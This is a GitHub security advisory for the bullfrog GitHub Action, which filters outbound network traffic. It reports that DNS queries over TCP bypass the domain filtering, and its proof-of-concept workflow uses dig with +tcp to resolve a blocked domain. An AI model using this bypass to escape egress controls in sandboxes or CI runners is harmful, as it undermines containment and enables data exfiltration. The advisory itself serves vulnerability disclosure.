# [M] Bullfrog's DNS over TCP bypasses domain filtering

## Summary
Severity: Medium
Advisory: GHSA-m32f-fjw2-37v3
CVE: CVE-2025-47775
CWE: CWE-201
Ecosystem: GitHub Actions
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2025-05-15
Source: https://github.com/advisories/GHSA-m32f-fjw2-37v3
Type: github-advisory

## Affected
- GitHub Actions: `bullfrogsec/bullfrog` — affected >=0 <0.8.4

## Details
### Summary

Using tcp breaks blocking and allows DNS exfiltration. 

### PoC

```
name: test
on:
  push:
    branches:
      - "*"

jobs:
  testBullFrog:
    runs-on: ubuntu-22.04
    steps:
      - name: Use google dns
        run: |
          sudo resolvectl dns eth0 1.1.1.1
          resolvectl status
      - name: Set up bullfrog to block everything
        uses: bullfrogsec/bullfrog@1472c28724ef13ea0adc54d0a42c2853d42786b1 # v0.8.2
        with:
           egress-policy: block
           allowed-domains: |
             *.github.com
      - name: Test connectivity
        run: |
          echo testing udp allowed ..
          dig api.github.com @1.1.1.1 || :
          echo testing tcp allowed ..
          dig api.github.com @1.1.1.1 +tcp || :

          echo testing udp not allowed
          dig api.google.com @1.1.1.1 || :
          echo testing tcp not allowed
          dig api.google.com @1.1.1.1 +tcp || :
```

### Impact

sandbox bypass

![image](https://github.com/user-attachments/assets/fba18a17-2d49-48cd-9aae-713e95b5270d)

## References
- https://github.com/bullfrogsec/bullfrog/security/advisories/GHSA-m32f-fjw2-37v3
- https://nvd.nist.gov/vuln/detail/CVE-2025-47775
- https://github.com/bullfrogsec/bullfrog/commit/ae7744ae4b3a6f8ffc2e49f501e30bf1a43d4671
- https://github.com/bullfrogsec/bullfrog
- https://github.com/bullfrogsec/bullfrog/releases/tag/v0.8.4
